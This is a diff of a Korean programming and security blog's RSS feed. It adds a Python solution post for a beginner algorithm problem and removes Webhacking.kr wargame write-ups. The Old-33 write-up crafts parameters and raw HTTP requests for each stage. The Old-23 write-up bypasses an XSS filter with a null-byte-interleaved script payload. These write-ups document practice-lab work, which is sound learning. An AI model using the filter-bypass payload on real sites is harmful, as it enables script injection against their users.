+      <guid>https://lrtk-coder.github.io/2021/05/20/Programmers-Level-1-%EC%88%98%EB%B0%95%EC%88%98%EB%B0%95%EC%88%98%EB%B0%95%EC%88%98%EB%B0%95%EC%88%98%EB%B0%95%EC%88%98/</guid>
+      <pubDate>Thu, 20 May 2021 07:59:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h1 id=&quot;수박수박수박수박수박수&quot;&gt;&lt;a href=&quot;#수박수박수박수박수박수&quot; class=&quot;headerlink&quot; title=&quot;수박수박수박수박수박수?&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h1 id="수박수박수박수박수박수"><a href="#수박수박수박수박수박수" class="headerlink" title="수박수박수박수박수박수?"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12922">수박수박수박수박수박수?</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>길이가 n이고, “수박수박수박수….”와 같은 패턴을 유지하는 문자열을 리턴하는 함수, solution을 완성하세요. 예를들어 n이 4이면 “수박수박”을 리턴하고 3이라면 “수박수”를 리턴하면 됩니다.</p><h2 id="제한-조건"><a href="#제한-조건" class="headerlink" title="제한 조건"></a>제한 조건</h2><ul><li>n은 길이 10,000이하인 자연수입니다.</li></ul><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><p>구현 문제로, 분석을 통해 쉽게 풀 수 있다.</p><ul><li><p>방법1<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">n:<span class="built_in">int</span></span>):</span></span><br><span class="line">result = <span class="string">&quot;수박&quot;</span>*<span class="number">5000</span></span><br><span class="line"><span class="keyword">return</span> result[:n]</span><br></pre></td></tr></table></figure><p>제한 조건을 보면, 최대 입력값은 10,000로 정해져있다.<br><br>이를 이용하여, 수박을 최대치로 구하여 인덱싱으로 입력값만큼의 크기로 반환하였다.</p></li><li><p>방법2<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">n:<span class="built_in">int</span></span>):</span></span><br><span class="line">    half = n//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> n%<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;수박&#x27;</span>*half + <span class="string">&#x27;수&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;수박&#x27;</span>*half</span><br></pre></td></tr></table></figure><p>입력값의 절반을 구하여 홀수면 수박을 절반만큼 반복 후에 뒤에 ‘수’를 붙어서 반환, 짝수면 수박을 절반만큼 반복하여 반환하였다.</p></li><li><p>방법3<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">n:<span class="built_in">int</span></span>):</span></span><br><span class="line">    half = n//<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;수박&#x27;</span>*half + <span class="string">&#x27;수&#x27;</span>*(n%<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>방법2을 더 효율적으로 수정한 버전이다.<br><br>홀수면 <code>n%2</code>의 값이 1으로 수가 추가되고, 짝수면 <code>n%2</code>의 값이 0이므로 수가 추가가 되지 않는다.</p></li></ul>]]></content:encoded>
+      
+      
+      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
+      
+      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
+      
+      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
+      
+      
+      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
+      
+      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
+      
+      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
+      
+      
+      <comments>https://lrtk-coder.github.io/2021/05/20/Programmers-Level-1-%EC%88%98%EB%B0%95%EC%88%98%EB%B0%95%EC%88%98%EB%B0%95%EC%88%98%EB%B0%95%EC%88%98%EB%B0%95%EC%88%98/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>Webhacking.kr Old - 21 Write Up</title>
@@ -365,202 +583,6 @@
       
       
       <comments>https://lrtk-coder.github.io/2021/05/12/%EB%B0%B1%EC%A4%80-%EC%8B%A4%EB%B2%84-1929%EB%B2%88-%EB%AC%B8%EC%A0%9C/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>Webhacking.kr Old - 33 Write Up</title>
-      <link>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-33-Write-Up/</link>
-      <guid>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-33-Write-Up/</guid>
-      <pubDate>Wed, 12 May 2021 14:39:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-33"><a href="#Old-33" class="headerlink" title="Old - 33"></a>Old - 33</h2><p>이번 문제는 엄청 길어질 거 같아서 하나씩 나눠서 정리하였다.</p><h3 id="33-1-풀이"><a href="#33-1-풀이" class="headerlink" title="33-1 풀이"></a>33-1 풀이</h3><p><img src="/images/pasted-364.png"><br>view-source에서 코드를 살펴보니, 다음 문제로 넘어갈 힌트를 얻을 수 있었다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;get&#x27;</span>]==<span class="string">&quot;hehe&quot;</span>) <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=???&gt;Next&lt;/a&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span>(<span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Get 메소드로 <code>get=hehe</code>를 서버로 보내면, 다음 문제로 넘어갈 수 있는 a태그가 출력되는 것을 알 수 있었다.</p><p><img src="/images/pasted-365.png"><br>a태그가 출력되었고, 나는 다음 문제로 넘어갔다.</p><h3 id="33-2-풀이"><a href="#33-2-풀이" class="headerlink" title="33-2 풀이"></a>33-2 풀이</h3><p><img src="/images/pasted-366.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;post&#x27;</span>]==<span class="string">&quot;hehe&quot;</span> &amp;&amp; $_POST[<span class="string">&#x27;post2&#x27;</span>]==<span class="string">&quot;hehe2&quot;</span>) <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=???&gt;Next&lt;/a&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;Wrong&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이번 문제는 Post 메소드로 <code>post=hehe</code>와 <code>post2=hehe2</code>를 넘겨줘야 다음 문제로 넘어 갈 수 있었다.</p><p><img src="/images/pasted-367.png"><br>Post 메소드로 위의 값을 서버로 보내서 다음 문제로 넘어갈 수 있었다.</p><h3 id="33-3-풀이"><a href="#33-3-풀이" class="headerlink" title="33-3 풀이"></a>33-3 풀이</h3><p>문제 페이지에서 출력되는 텍스트는 같으니, 코드만 정리노트에 적겠다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;myip&#x27;</span>] == $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=???&gt;Next&lt;/a&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;Wrong&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>파라미터 이름이 myip라서, 나의 IP를 넣으면 되는지 아니면 서버의 IP 주소를 넣으면 되는지를 몰라서 <code>$_SERVER[&#39;REMOTE_ADDR&#39;])</code>에 대해서 알아보았다.</p><p>그 결과 웹서버에 접속한 접속한 IP의 주소를 갖고 있는 배열이였다.</p><p><img src="/images/pasted-368.png"><br>서버에 내 IP를 보내기 위해 나의 외부 IP 주소를 알아내기 위해 네이버에 검색하여 알아낸 후, Get 메소드로 서버에 전달하였다.</p><p><img src="/images/pasted-369.png"><br>다음 문제로 넘어갈 수 있었다.</p><h3 id="33-4-풀이"><a href="#33-4-풀이" class="headerlink" title="33-4 풀이"></a>33-4 풀이</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_GET[‘password’] == md5(time())) <span class="keyword">echo</span> “&lt;a href=??<span class="meta">?&gt;</span>Next&lt;/a&gt;”;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> “hint : “.time();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이번에는 현재 시간을 MD5으로 해쉬화한 값을 Get 메소드로 서버에 전달해야한다.</p><p>나는 현재 페이지에 출력된 값을 100 증가하여, MD5 해쉬화 후 나온 값을 서버에 계속 전달할 것이다.</p><p>그럼 어느 순간 내가 보낸 시간이 도달하면 문제가 풀리는 것이다.</p><p><img src="/images/pasted-370.png"><br>다음 문제로 넘어가겠다.</p><h3 id="33-5-풀이"><a href="#33-5-풀이" class="headerlink" title="33-5 풀이"></a>33-5 풀이</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_GET[‘imget’] &amp;&amp; $_POST[‘impost’] &amp;&amp; $_COOKIE[‘imcookie’]) <span class="keyword">echo</span> “&lt;a href=??<span class="meta">?&gt;</span>Next&lt;/a&gt;”;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> “Wrong”;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이번에는 Get, Post, Cookie 값이 동일해야 다음 문제로 넘어갈 수 있었다.</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/challenge/bonus-6/md555.php?imget=1</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: webhacking.kr</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=r0sakaqij4i0q7dk82fis0kchg; imcookie=1</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span>: &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;90&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span>: ?0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span>: none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span>: navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span>: ?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span>: document</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">impost=1</span><br></pre></td></tr></table></figure><p>위와 같이 메소드를 POST로 지정하여, URL에 imget 파라미터를 지정, Body에 impost를 지정, Cookie에 imcookie를 지정하여 서버로 전달하였다.</p><p><img src="/images/pasted-371.png"><br>다음 문제로 넘어갈 수 있었다.</p><h3 id="33-6-풀이"><a href="#33-6-풀이" class="headerlink" title="33-6 풀이"></a>33-6 풀이</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_COOKIE[‘test’] == md5($_SERVER[‘REMOTE_ADDR’]) &amp;&amp; $_POST[‘kk’] == md5($_SERVER[‘HTTP_USER_AGENT’])) <span class="keyword">echo</span> “&lt;a href=??<span class="meta">?&gt;</span>Next&lt;/a&gt;”;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> “hint : &#123;$_SERVER[‘HTTP_USER_AGENT’]&#125;”;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이번 문제는 내 외부 IP를 MD5 해쉬화한 값, USER_AGENT 값을 MD5 해쉬화한 값을 구하여 각각 Cookie와 kk 파라미터에 지정해야한다.</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/challenge/bonus-6/gpcc.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: webhacking.kr</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=r0sakaqij4i0q7dk82fis0kchg; test=MD5(외부 IP)</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span>: &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;90&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span>: ?0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span>: none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span>: navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span>: ?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span>: document</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">kk=3651f072395347537c74089989c88a66</span><br></pre></td></tr></table></figure><p>위와 같이 Cookie와 kk 파라미터를 보내고 다음 문제로 넘어갈 수 있었다.</p><h3 id="33-7-풀이"><a href="#33-7-풀이" class="headerlink" title="33-7 풀이"></a>33-7 풀이</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_SERVER[‘REMOTE_ADDR’] = str_replace(“.”,””,$_SERVER[‘REMOTE_ADDR’]);</span><br><span class="line"><span class="keyword">if</span>($_GET[$_SERVER[‘REMOTE_ADDR’]] == $_SERVER[‘REMOTE_ADDR’]) <span class="keyword">echo</span> “&lt;a href=??<span class="meta">?&gt;</span>Next&lt;/a&gt;”;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> “Wrong&lt;br&gt;”.$_GET[$_SERVER[‘REMOTE_ADDR’]];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이번 문제는 나의 외부 IP 주소에서 <code>.</code>를 제거한 값을 Get 메소드로 전달하면 된다.</p><p><img src="/images/pasted-372.png"><br>다음 문제로 넘어갈 수 있었다.</p><h3 id="33-8-풀이"><a href="#33-8-풀이" class="headerlink" title="33-8 풀이"></a>33-8 풀이</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">&#x27;addr&#x27;</span>]) $addr = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>($addr == <span class="string">&quot;127.0.0.1&quot;</span>) <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=???&gt;Next&lt;/a&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;Wrong&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이번엔 Get 메소드의 addr 파라미터 값이 127.0.0.1이 되야지만, 다음 문제로 넘어갈 수 있다.</p><p><img src="/images/pasted-373.png"><br><code>addr=127.0.0.1</code>를 넘겨주고, 다음 문제로 넘어갈 수 있었다.</p><h3 id="33-9-풀이"><a href="#33-9-풀이" class="headerlink" title="33-9 풀이"></a>33-9 풀이</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">97</span>;$i&lt;=<span class="number">122</span>;$i=$i+<span class="number">2</span>)&#123;</span><br><span class="line">  $answer.=chr($i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;ans&#x27;</span>] == $answer) <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=???.php&gt;Next&lt;/a&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;Wrong&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이번엔 아스키코드 97부터 122번까지 2씩 증가하여 나온 값을 answer에 넣어줘야한다.</p><p>간단하게 코딩으로 하지않고, 직접 구해보았다.</p><p>acegikmoqsuwy이라는 값을 구하였고, 값을 Get 메소드로 전달하였다.</p><p><img src="/images/pasted-374.png"><br>다음 문제로 넘어갈 수 있었다.</p><h3 id="33-10-풀이"><a href="#33-10-풀이" class="headerlink" title="33-10 풀이"></a>33-10 풀이</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = $_SERVER[‘REMOTE_ADDR’];</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=strlen($ip);$i++) $ip=str_replace($i,ord($i),$ip);</span><br><span class="line">$ip=str_replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$ip);</span><br><span class="line">$ip=substr($ip,<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line">$answer = $ip*<span class="number">2</span>;</span><br><span class="line">$answer = $ip/<span class="number">2</span>;</span><br><span class="line">$answer = str_replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$answer);</span><br><span class="line">$f=fopen(“answerip/&#123;$answer&#125;_&#123;$ip&#125;.php”,”w”);</span><br><span class="line">fwrite($f,”<span class="meta">&lt;?php</span> <span class="keyword">include</span> \”../../../config.php\”; solve(<span class="number">33</span>); unlink(<span class="keyword">__FILE__</span>); <span class="meta">?&gt;</span>”);</span><br><span class="line">fclose($f);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>answer이 구해지는 코드를 파이썬으로 구현하였다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ip = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">start = <span class="number">0</span></span><br><span class="line">end = <span class="built_in">len</span>(ip)</span><br><span class="line"><span class="keyword">while</span> start &lt;= end:</span><br><span class="line">    ip = ip.replace(<span class="built_in">str</span>(start), <span class="built_in">str</span>(<span class="built_in">ord</span>(<span class="built_in">str</span>(start)[<span class="number">0</span>])))</span><br><span class="line">    start += <span class="number">1</span></span><br><span class="line">    end = <span class="built_in">len</span>(ip)</span><br><span class="line"></span><br><span class="line">ip = ip.replace(‘.’, ‘’)[:<span class="number">10</span>]</span><br><span class="line">answer = <span class="built_in">str</span>(<span class="built_in">int</span>(ip) / <span class="number">2</span>).replace(‘.’, ‘’)</span><br><span class="line">print(<span class="string">f&#x27;answerip/<span class="subst">&#123;answer&#125;</span>_<span class="subst">&#123;ip&#125;</span>.php&#x27;</span>)</span><br></pre></td></tr></table></figure><p>이때 파이썬과 PHP 간의 차이점을 알 수 있었다.</p><p>PHP의 For문 같은 경우,<br>ip의 길이를 최대 반복 수로 지정하였는데 ip의 길이가 증가할 때마다 최대 반복 수가 그것을 반영하여 반복 수가 증가하였다.</p><p>Pytho의 경우,<br>한번 지정된 최대 반복 수는 고정이다.</p><p>이것을 몰라서 계속 잘못된 곳을 찾고 있었는데, PHP로 반복문의 반복 수를 찍어보니 알 수 있었다.<br>그래서 파이썬으로 구현된 코드는 for문으로 구현하지 않고 while문으로 구현하였다.</p><p>출력된 값을 <code>answerip/&#123;$answer&#125;_&#123;$ip&#125;.php</code>에 대입하여 서버로 전달하였다.<br>이때 IP의 값은 <code>ip = ip.replace(‘.’, ‘’)[:10]</code>의 값이다.</p><p><img src="/images/pasted-375.png"><br>이렇게 개고생을 하여 flag를 획득할 수 있었다.</p>]]></content:encoded>
-      
-      
-      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
-      
-      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
-      
-      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
-      
-      
-      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
-      
-      
-      <comments>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-33-Write-Up/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>Webhacking.kr Old - 23 Write Up</title>
-      <link>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-23-Write-Up/</link>
-      <guid>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-23-Write-Up/</guid>
-      <pubDate>Wed, 12 May 2021 14:36:11 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-23"><a href="#Old-23" class="headerlink" title="Old - 23"></a>Old - 23</h2><p><img src="/images/pasted-360.png"><br>이번 문제는 xss 문제인 것 같다.</p><p>일단, 밑에 나온 alert 창을 띄우는 스크립트를 삽입하면 어떻게 반응하는지 확인하였다.</p><p><img src="/images/pasted-361.png"><br><code>&lt;script&gt;alert(1);&lt;/script&gt;</code><br>스크립트가 서버의 xss 필터에 걸리면, no hack을 출력하는 것을 볼 수 있다.</p><p>혹시 자바스크립트로 xss 필터 기능을 정의했는지 또는 주석으로 힌트가 있는지 확인해보았다.<br><br>확인한 결과 PHP에서 xss필터 기능을 정의되었고, 코드 상에는 힌트가 없었다.</p><p>그렇다면, xss 필터가 어떤 것을 필터링하는지 확인을 해야한다.</p><p>필터링 목록</p><ul><li>script</li><li>alert</li><li>Xss에 사용되는 HTML 태그 (img, svg, onclock, onerror 등등)</li></ul><p>손으로 직접쳐서 확인한 결과 대문자 상관없이 script와 alert가 필터링 되어있었다.<br><br>또한 단어에서 사용된 알파벳 2이상 조합하는 것도 필터링 되었다.<br>e.g.) sc, ri, cs, al, lt</p><p>하지만, 특수문자는 필터링이 되어있지 않았다.</p><p>필터링을 우회하기 위해 나는 이중 인코딩, Null 바이트를 사용하여 우회를 시도하였다.</p><p>일단, 문제에서 주어진 것은 <code>&lt;script&gt;alert(1);&lt;/script&gt;</code>이라서 이것을 가지고 시도하였다.</p><h3 id="이중-인코딩"><a href="#이중-인코딩" class="headerlink" title="이중 인코딩"></a>이중 인코딩</h3><p><img src="/images/pasted-362.png" alt="upload successful"><br> <code>&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;</code>를 이중 url 인코딩 한 값을 서버로 보내니, 한번의 디코딩 후 출력되어 필터링을 우회할 수 없었다.</p><h3 id="Null-바이트"><a href="#Null-바이트" class="headerlink" title="Null 바이트"></a>Null 바이트</h3><p>필터에 걸리는 script와 alert의 알파벳 사이에 null 바이트를 넣어서 서버로 보냈다.</p><p><img src="/images/pasted-363.png" alt="`&lt;%00s%00c%00r%00i%00p%00t&gt;%00a%00l%00e%00r%00t(1);&lt;/%00s%00c%00r%00i%00p%00t&gt;`"></p><p>그 결과 xss이 성공하여 flag를 획득할 수 있다.</p>]]></content:encoded>
-      
-      
-      
-      
-      <comments>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-23-Write-Up/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>Webhacking.kr Old - 20 Write Up</title>
-      <link>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-20-Write-Up/</link>
-      <guid>https://lrtk-coder.github.io/2021/05/12/Webhacking-kr-Old-20-Write-Up/</guid>
